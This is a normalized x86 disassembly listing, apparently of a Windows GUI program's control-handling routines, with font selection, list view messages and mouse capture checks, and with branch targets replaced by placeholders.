mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
mov ebx edi
dec ebx
cmp ebx 0x0
jl r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x218 ]
mov edx ebx
call sub_4188a0
test [ eax + 0x1c ] 0x10
jne r-xdata
cmp [ ebp - 0xd ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x218 ]
mov edx ebx
call sub_4188a0
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
mov al [ eax + 0x17d ]
add al 0xfd
sub al 0x2
jae r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax [ esi + 0x48 ]
add [ ebp - 0xc ] eax
jmp r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x218 ]
mov edx ebx
call sub_4188a0
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_418df8
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_418df8
test al al
jne r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov [ ebp - 0xd ] 0x1
mov edi ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x248 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov cl 0x1
mov edx ebx
call sub_418dcc
inc [ ebp - 0x8 ]
jmp r-xdata
mov [ ebp - 0xd ] 0x1
mov edi ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x248 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov cl 0x1
mov edx ebx
call sub_418dcc
inc [ ebp - 0x8 ]
jmp r-xdata
sub_43781c
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
mov [ ebp - 0x4 ] edx
lea ecx [ ebp - 0x24 ]
or edx 0xffffffff
or eax 0xffffffff
call sub_406318
lea ecx [ ebp - 0x1c ]
xor edx edx
xor eax eax
call sub_406318
xor ebx ebx
mov eax [ ebp + 0x8 ]
push eax
xor eax eax
call sub_437610
pop ecx
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x10 ]
lea eax [ ebp - 0x14 ]
call sub_437408
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax 0x7fffffff
call sub_437610
pop ecx
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x8 ]
lea eax [ ebp - 0xc ]
call sub_437408
pop ecx
jmp r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x14 ]
cmp edx eax
jg r-xdata
mov ecx [ ebp - 0x1c ]
mov [ ebp - 0x24 ] ecx
mov ecx [ ebp - 0x18 ]
mov [ ebp - 0x20 ] ecx
mov ecx eax
add ecx edx
sar ecx 0x1
jns r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x1c ] ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax ecx
call sub_437610
pop ecx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x18 ]
lea eax [ ebp - 0x1c ]
call sub_437408
pop ecx
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov eax [ ebp - 0x18 ]
cmp edx eax
jge r-xdata
adc ecx 0x0
mov edx [ ebp - 0x4 ]
cmp eax [ edx ]
jge r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x1c ]
jne r-xdata
mov eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x24 ]
cmp eax [ ebp - 0x1c ]
jne r-xdata
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebp - 0x20 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0xc ]
call sub_437610
pop ecx
mov ebx eax
jmp r-xdata
sub_437930
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x4 ] edx
xor edi edi
mov ebx [ eax ]
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_437610
pop ecx
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push eax
xor eax eax
call sub_437610
pop ecx
cmp eax [ ebp - 0x8 ]
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0xc ]
lea eax [ ebp - 0x10 ]
call sub_437408
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_437610
pop ecx
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx edi
jle r-xdata
lea esi [ ebx + edi ]
sar esi 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_437610
pop ecx
cmp eax [ ebp - 0x8 ]
jne r-xdata
adc esi 0x0
cmp esi edi
jne r-xdata
mov ebx esi
jmp r-xdata
mov edi esi
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_437610
pop ecx
jmp r-xdata
cmp ebx edi
jg r-xdata
sub_4379c4
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x11 ] 0x1
mov eax [ ebp - 0x4 ]
call sub_44fab8
test al al
je r-xdata
mov al [ ebp - 0x11 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_436e78
mov ebx eax
dec ebx
test ebx ebx
jge r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_4489b8
mov [ ebp - 0x25 ] eax
mov eax [ ebp - 0x4 ]
call sub_4489fc
mov ebx eax
mov [ ebp - 0x21 ] ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
sub eax [ ebp - 0x25 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
sub eax ebx
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x25 ]
mov [ ebp - 0x35 ] eax
mov eax [ ebp - 0x21 ]
mov [ ebp - 0x31 ] eax
push ebp
lea edx [ ebp - 0x21 ]
lea eax [ ebp - 0x25 ]
call sub_437408
pop ecx
lea ecx [ ebp - 0x2d ]
mov edx [ ebp - 0x10 ]
mov edx [ edx ]
sub edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov eax [ eax ]
sub eax [ ebp - 0x18 ]
call sub_406318
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x5b ]
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x2d ]
sub eax [ ebp - 0x35 ]
cdq
xor eax edx
sub eax edx
mov ecx eax
mov eax [ ebp - 0x29 ]
sub eax [ ebp - 0x31 ]
cdq
xor eax edx
sub eax edx
cmp ecx eax
setl [ ebp - 0x1d ]
add al 0xfd
sub al 0x2
setb al
mov [ ebp - 0x1d ] al
jmp r-xdata
push ebp
lea edx [ ebp - 0x29 ]
lea eax [ ebp - 0x2d ]
call sub_437408
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_437ba9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x8 ]
call sub_418d28
cmp [ ebp - 0x1d ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x5
je r-xdata
push ebp
lea edx [ ebp - 0x29 ]
lea eax [ ebp - 0x2d ]
call sub_437930
pop ecx
push ebp
lea edx [ ebp - 0x29 ]
lea eax [ ebp - 0x2d ]
call sub_43781c
pop ecx
jmp r-xdata
cmp [ ebp - 0x1d ] 0x0
jne r-xdata
mov eax [ ebp - 0x2d ]
cmp eax [ ebp - 0x25 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x0
jne r-xdata
push ebp
lea edx [ ebp - 0x29 ]
lea eax [ ebp - 0x2d ]
call sub_437408
pop ecx
cmp [ ebp - 0x1d ] 0x0
jne r-xdata
mov eax [ ebp - 0x2d ]
add eax [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov [ edx ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x4 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x29 ]
cmp eax [ ebp - 0x21 ]
je r-xdata
mov eax [ ebp - 0x29 ]
add eax [ ebp - 0x1c ]
mov edx [ ebp - 0x10 ]
mov [ edx ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x0
jne r-xdata
cmp [ ebp - 0x1d ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_435a94
jmp r-xdata
inc esi
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_4364cc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403368
retn
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_418df8
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
mov edx ebx
call sub_4188a0
pop edx
call sub_4351cc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
mov edx ebx
call sub_4188a0
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
sub_437c14
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov edx [ esi + 0x4 ]
mov eax ebx
call sub_435d00
pop esi
pop ebx
retn
mov edx [ esi + 0x4 ]
mov eax ebx
call sub_435c44
pop esi
pop ebx
retn
sub_437c44
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x2c9 ] 0x0
je r-xdata
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
mov eax ebx
call sub_44a180
test eax eax
je r-xdata
mov [ esi + 0xc ] 0x1
sub_437c7c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_44ec38
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
cmp [ ebx + 0x227 ] 0x0
je r-xdata
mov dx [ edi + 0x4 ]
mov eax ebx
call sub_438a5c
mov esi eax
test esi esi
je r-xdata
cmp [ esi + 0x17d ] 0x2
jne r-xdata
cmp [ esi + 0x178 ] 0x0
jne r-xdata
call sub_432ff0
cmp eax 0x40047
jge r-xdata
mov edx esi
mov eax ebx
mov si 0xffaf
call sub_403564
jmp r-xdata
cmp [ esi + 0x174 ] 0x0
je r-xdata
mov eax esi
mov si 0xffeb
call sub_403564
mov [ edi + 0xc ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_437d08
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44eca0
mov edx esi
mov eax ebx
call sub_44c504
pop esi
pop ebx
retn
sub_437d54
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44f110
cmp [ esi + 0x4 ] 0x12
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb3
call sub_403564
sub_437d8c
push ebx
mov ebx eax
mov eax ebx
call sub_43914c
mov [ ebx + 0x2d9 ] 0x0
call sub_432ff0
cmp eax 0x50050
jne r-xdata
mov [ ebx + 0x2c8 ] 0x1
pop ebx
retn
cmp [ ebx + 0x2d4 ] 0x0
je r-xdata
mov eax [ ebx + 0x2d4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
sub_437dc8
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx + 0x8 ]
mov eax [ ebx + 0x8 ]
cmp eax 0xfffffd3f
jg r-xdata
sub eax 0xfffffd40
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x258 ] 0x0
jne r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x258 ] 0x1
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_439a64
mov eax [ ebp - 0x4 ]
call sub_438620
mov eax [ ebp - 0x4 ]
mov [ eax + 0x258 ] 0x0
add eax 0x2cb
cmp eax 0x9
ja r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2c2 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_438620
mov eax [ ebp - 0x4 ]
mov [ eax + 0x226 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x226 ] 0x1
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x264 ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2ba ] 0x0
je r-xdata
sub eax 0x3
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ eax * 4 + jump_table_437e01 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x258 ] 0x0
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2c4 ]
call [ ebx + 0x2c0 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x258 ] 0x0
jne r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2bc ]
call [ ebx + 0x2b8 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x226 ] 0x0
je r-xdata
sub eax 0x2b0
je r-xdata
mov eax [ ebp - 0x8 ]
lea eax [ ebx + 0x10 ]
push eax
mov ecx [ ebx + 0xc ]
mov edx 0x417
mov eax [ ebp - 0x4 ]
call sub_44a180
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xd4 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
mov edx [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
call sub_4188fc
test eax eax
jge r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xd8 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x226 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x226 ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_439a64
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_439858
and eax 0x7f
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
push ebp
push sub_4383ca
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
call sub_424df8
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
test [ ebx + 0xe ] 0x1
jne r-xdata
jmp r-xdata
mov esi [ ebx + 0x1c ]
test esi esi
je r-xdata
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov eax [ ebx + 0x1c ]
mov edx [ r-xdata ]
call sub_4034f4
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x258 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2a2 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_438620
mov edx [ ebx + 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_43653c
mov esi eax
test esi esi
jne r-xdata
lea edx [ ebp - 0x1a ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0xc ]
dec eax
je r-xdata
mov eax esi
mov si 0xffc7
call sub_403564
jmp r-xdata
xor eax eax
mov al [ ebx + 0x19 ]
cmp ax [ rw-data ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2aa ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2a4 ]
call [ ebx + 0x2a0 ]
jmp r-xdata
mov eax [ ebx + 0xc ]
sub eax 0x10001
je r-xdata
call sub_403bc8
jmp r-xdata
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xdc ]
test al al
je r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_434620
mov esi eax
mov dl 0x3
mov eax esi
call sub_435110
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
mov ecx esi
call sub_41891c
mov eax [ ebp - 0x4 ]
inc [ eax + 0x264 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
call sub_4188a0
mov esi eax
mov ebx [ ebp - 0x4 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2ac ]
call [ ebx + 0x2a8 ]
jmp r-xdata
test [ ebx + 0xc ] 0x10002
je r-xdata
dec eax
je r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xdc ]
test al al
jne r-xdata
xor eax eax
push ebp
push sub_437fc7
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebx + 0x10 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
call sub_4251ec
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
call sub_42508c
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x170 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
call sub_4250a8
lea edx [ ebp - 0x1a ]
xor ecx ecx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xcc ]
mov [ ebp - 0x9 ] al
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov cl 0x1
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xdc ]
test al al
je r-xdata
dec eax
je r-xdata
xor edx edx
push ebp
push sub_438352
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebx + 0x10 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
call sub_4251ec
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
call sub_42508c
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x170 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
call sub_4250a8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx [ eax + 0xc ]
mov ecx [ ebp - 0x4 ]
mov [ edx + 0xc ] ecx
mov [ edx + 0x8 ] sub_438c7c
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0xc ] edx
mov [ eax + 0x8 ] sub_438c7c
mov eax [ ebp - 0x4 ]
mov [ eax + 0x224 ] 0x0
mov al [ r-xdata ]
mov [ ebp - 0xa ] al
push 0x0
lea eax [ ebp - 0xa ]
push eax
mov cx [ ebx + 0x28 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xd0 ]
mov [ ebp - 0x9 ] al
test [ ebp - 0xa ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2e8 ] 0x0
je r-xdata
test esi esi
je r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x20
mov cl 0x2
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xdc ]
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_423d18
mov [ ebx + 0x3c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov eax [ eax + 0x14 ]
call sub_42499c
call sub_423d18
mov [ ebx + 0x48 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
xor edx edx
call sub_4251ec
retn
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x4
call sub_403bc8
call sub_403bc8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
call sub_425064
retn
lea edx [ ebp - 0x1a ]
mov cl 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xcc ]
jmp r-xdata
mov cl 0x2
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xdc ]
test al al
je r-xdata
dec eax
je r-xdata
test [ ebp - 0xa ] 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x10000
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2ec ] 0x0
je r-xdata
push 0x1
lea eax [ ebp - 0xa ]
push eax
mov cx [ ebx + 0x28 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xd0 ]
jmp r-xdata
test esi esi
je r-xdata
dec eax
je r-xdata
mov cl 0x3
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xdc ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x10
mov cl 0x1
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xdc ]
test al al
je r-xdata
lea edx [ ebp - 0x1a ]
mov cl 0x2
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xcc ]
jmp r-xdata
mov cl 0x3
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xdc ]
test al al
je r-xdata
jmp r-xdata
test [ ebp - 0xa ] 0x4
je r-xdata
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x20000
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2ec ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2e8 ]
push eax
call DeleteObject
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x2e8 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x2ec ] edx
push 0x2
lea eax [ ebp - 0xa ]
push eax
mov cx [ ebx + 0x28 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xd0 ]
jmp r-xdata
test esi esi
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x40
jmp r-xdata
lea edx [ ebp - 0x1a ]
mov cl 0x3
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xcc ]
jmp r-xdata
test [ ebp - 0xa ] 0x8
je r-xdata
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x40000
push 0x3
lea eax [ ebp - 0xa ]
push eax
mov cx [ ebx + 0x28 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xd0 ]
test [ ebp - 0xa ] 0x10
je r-xdata
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x80000
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_423d18
mov [ ebx + 0x3c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov eax [ eax + 0x14 ]
call sub_42499c
call sub_423d18
mov [ ebx + 0x48 ] eax
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x100000
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x224 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x4
call sub_403bc8
call sub_403bc8
jmp r-xdata
mov cl 0x1
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xdc ]
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x224 ] 0x0
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x220 ]
mov eax [ esi + 0xc ]
xor edx edx
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] edx
mov eax [ esi + 0x14 ]
xor edx edx
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] edx
lea eax [ ebp - 0x56 ]
push eax
push 0x3c
mov eax [ esi + 0xc ]
call sub_4241ec
push eax
call GetObjectA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
xor edx edx
call sub_4251ec
retn
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x10
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
xor edx edx
call sub_4251ec
lea eax [ ebp - 0x56 ]
push eax
call CreateFontIndirectA
mov esi eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x2e8 ] esi
push esi
mov eax [ ebx + 0x10 ]
push eax
call SelectObject
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2ec ] eax
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x2
sub_438620
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx eax
push 0x0
push 0x0
push 0x418
mov eax ebx
call sub_44f7b4
push eax
call SendMessageA
mov esi eax
mov eax [ ebx + 0x218 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov edi esi
dec edi
test edi edi
jl r-xdata
mov eax ebx
call sub_436c1c
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor esi esi
mov edx [ esp + 0xc ]
mov eax [ ebx + 0x218 ]
call sub_418744
inc esi
dec edi
jne r-xdata
mov ecx [ ebx + 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_434620
mov ebp eax
mov dl 0x3
mov eax ebp
call sub_435110
mov [ esp + 0xc ] ebp
mov [ ebp + 0x184 ] ebx
push 0x0
push esi
push 0x416
mov eax ebx
call sub_44f7b4
push eax
call SendMessageA
mov eax esp
push eax
push esi
push 0x415
mov eax ebx
call sub_44f7b4
push eax
call SendMessageA
mov eax esp
push eax
push esi
push 0x417
mov eax ebx
call sub_44f7b4
push eax
call SendMessageA
cmp [ esp + 0xc ] 0x0
jne r-xdata
sub_4386e8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_44f7b4
mov esi eax
call GetCapture
cmp esi eax
jne r-xdata
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x8 ] edx
call sub_446134
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
push 0x0
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_406e48
lea edx [ ebp - 0x8 ]
